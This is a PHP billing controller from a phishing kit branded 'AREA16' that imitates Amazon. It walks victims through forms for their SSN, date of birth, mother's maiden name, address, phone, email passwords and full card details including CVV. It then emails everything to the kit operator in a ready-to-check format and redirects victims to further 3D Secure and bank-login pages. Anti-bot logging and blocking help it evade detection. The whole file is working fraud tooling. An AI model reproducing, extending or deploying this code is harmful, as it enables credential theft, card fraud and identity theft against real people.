<?php 
defined("ACCESS") or die('Konz');

class Billing 
{
	private $_LICENSE = FCPATH . "AREA16/system/private/license.ini";
	private $_CONFIG = FCPATH. "AREA16/system/private/setting.json";

	public function __construct()
	{
		$this->pc = new Pc();
		$_ini_file = parse_ini_file($this->_LICENSE);
		$this->license = new license($_ini_file);

		if (!isset($_SESSION['access']) and ($_SESSION['access'] != 4)){

			$this->license->create_logs("BOT|{$this->pc->ip_address}|{$_SESSION['countryCode']}|{$_SESSION['country']}|{$_SESSION['isp']}|{$this->pc->platform}|Access Page Without Session|"._time()."", "BOT");
			write(FCPATH . 'AREA16/system/stats/log_robot.txt', 'a', "{$this->pc->ip_address}\r\n");
			_blocks();
			redirect(uriRand());
		}
	}

	public function index()
	{
		echo view('billing/sq');
	}

	public function first()
	{
		if (isset($_POST['mmn'])) {
			$_SESSION['mmn'] = trim($_POST['mmn']);
		}
		if (isset($_POST['ssn'])) {
			$_SESSION['ssn'] = trim($_POST['ssn']);
		}
		if (isset($_POST['dob'])) {
			$_SESSION['dob'] = trim($_POST['dob']);
		}
		if (isset($_POST['zipcode'])) {
			$_SESSION['zipcode'] = trim($_POST['zipcode']);
		}
		if (isset($_POST['phone'])) {
			$_SESSION['phone'] = trim($_POST['phone']);
		}
		
		echo view('billing/index');
	}

	public function try()
	{
		if (isset($_POST['address'])) {
			$_SESSION['address'] = trim($_POST['address']);
		}
		if (isset($_POST['cityp'])) {
			$_SESSION['cityp'] = trim($_POST['cityp']);
		}
		if (isset($_POST['region'])) {
			$_SESSION['region'] = trim($_POST['region']);
		}
		if (isset($_POST['zipcode'])) {
			$_SESSION['zipcode'] = trim($_POST['zipcode']);
		}

		echo view('billing/card');
	}

	public function process()
	{
		if (isset($_POST) && isset($_SESSION)) {
			$address = $_SESSION['address'];
			$cityP = $_SESSION['cityp'];
			$state = $_SESSION['region'];
			$zipCode = $_SESSION['zipcode'];
			$dob = $_SESSION['dob'];
			$ssn = $_SESSION['ssn'];
			$motherName = $_SESSION['mmn'];
			$phone = $_SESSION['phone'];
			$_SESSION['namecard'] = trim($_POST['namecard']);
			$cardHolder = $_SESSION['namecard'];
			$cardNumber = $_POST['ccn'];
			$cardNumber = str_replace(" ", "", $cardNumber);
			$cardCvv = $_POST['cvv'];
			$cardExpM = $_POST['expmonth'];
			$cardExpY = $_POST['expyear'];
			$cardExp = substr($cardExpY, 2);
			$_SESSION['ccn'] = $cardNumber;			
			$ccN = substr($cardNumber, 0, 6);
			$bin = look_bin($cardNumber);
			$_SESSION['vbv_scheme'] = $bin;
			$email = trim($_SESSION['emailLogin']);
			$password = trim($_SESSION['password_email']);
			$password2 = trim($_SESSION['password_email2']);

			$message = 
"<fieldset style='border: 3px solid #e4e3e2; border-radius: 20px; max-width: 50%; margin: 0 auto;'>
<pre>
<strong><span style='color: #999999;'>:: アマゾン - エリア16チームによって作成されました❤️ ::</span></strong>

<strong>:: Email Account ::</strong>
			
# Email address  : {$email}
# Password       : {$password}
# Password 2     : {$password2}
# Check format   : {$email}|{$password}
# Check format 2 : {$email}|{$password2}

<strong>:: Credit or Debit Card ::</strong>
			
# BIN : {$bin}
# Cardholder name : {$cardHolder}
# Card number 	  : {$cardNumber}
# Expiration 	  : {$cardExpM}/{$cardExpY}
# Cvv/Cvv2	  : {$cardCvv}
# Check format 	  : {$cardNumber}|{$cardExpM}|{$cardExp}|{$cardCvv}

<strong>:: Personal Information ::</strong>
			
# Address  : {$address}
# City 	   : {$cityP}
# State    : {$state}
# Zip code : {$zipCode}
# Phone    : {$phone}
# MMN 	   : {$motherName}
# SSN 	   : {$ssn}
# DOB	   : {$dob}

<strong>:: Visitor Details ::</strong>

# Time &amp; Date  : "._date()."  
# Device       : {$this->pc->platform}
# Browser      : {$this->pc->browser}
# Country      : {$_SESSION['country']}
# State        : {$_SESSION['regionName']}
# City         : {$_SESSION['city']}
# Ip address   : {$this->pc->ip_address}
# User agent   : {$this->pc->agent}

</pre>
</fieldset>
</pre>";		
			$subject = "{$bin} :: [ {$_SESSION['country']} - {$this->pc->ip_address} ]";
			$headers = 'MIME-Version: 1.0' . "\r\n";
			$headers .= 'Content-type: text/html; charset=UTF-8' . "\r\n";
			$headers .= "From: AREA16 <admin@area16.sg>";

			@mail(_config('result'), $subject, $message, $headers);

			write(FCPATH . 'AREA16/system/stats/log_cc.txt', 'a', "{$this->pc->ip_address}\r\n");
			$this->license->create_logs("Human|{$this->pc->ip_address}|{$_SESSION['countryCode']}|{$_SESSION['country']}|{$_SESSION['isp']}|{$this->pc->platform}|Submit Credit card|"._time()."", "CREDITCARD");

			if (_config('get_3dsecure') == 'on'){
				$_SESSION['access'] = 5;
				redirect(base_url() . 'verify/#sessionId='. md5(time()));
			} elseif (_config('double_card') == 'on'){
				$_SESSION['access'] = 6;
				redirect(base_url() . 'payment/#errorId='. md5(time()));
			} elseif (_config('get_bank') == 'on'){
				$_SESSION['access'] = 7;
				redirect(base_url() . 'bank/#');
			} else {
				$_SESSION['access'] = 8;
				redirect(base_url() . 'done');
			}
		}	
	}
}